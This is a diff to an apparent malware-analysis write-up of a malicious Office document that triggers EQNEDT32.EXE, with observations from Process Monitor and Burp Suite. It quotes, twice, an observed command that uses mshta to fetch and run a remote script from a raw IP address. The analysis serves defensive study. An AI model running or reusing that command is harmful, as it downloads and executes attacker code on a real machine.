@@ -20,13 +20,15 @@
 4.	__Microsoft Office__ will automatically open it
 
 ### Process Monitor
-###### It is an [advanced monitoring tool for Windows](https://nvd.nist.gov/vuln-metrics/cvss).
-###### It is used to monitor and display all the activities of file system in real-time. [reference 1](https://en.wikipedia.org/wiki/Process_Monitor)
-* unexpected operation named 'EQNEDT32.EXE'
-* command line has been called
-* (very like) a malicious host - 'mshta http://104.254.99.77/x.txt' 
+It is an [advanced monitoring tool for Windows](https://nvd.nist.gov/vuln-metrics/cvss).  
+It is used to monitor and display all the activities of file system in real-time. [reference 1](https://en.wikipedia.org/wiki/Process_Monitor)  
+* Unexpected operation named 'EQNEDT32.EXE'
+* Command line has been called
+* (Very like) a malicious host - 'mshta http://104.254.99.77/x.txt' 
 
 
 ### Burp Suite
-###### It is a [web vulnerability scanner](https://portswigger.net/burp).
-###### It is a set of tools used for penetration testing of web applications. [reference 2](https://www.geeksforgeeks.org/what-is-burp-suite/g)
+It is a [web vulnerability scanner](https://portswigger.net/burp).  
+It is a set of tools used for penetration testing of web applications. [reference 2](https://www.geeksforgeeks.org/what-is-burp-suite/g)  
+* Unexpected 'GET' request 
+* (Very like) a malicious host - 'mshta http://104.254.99.77/x.txt' 
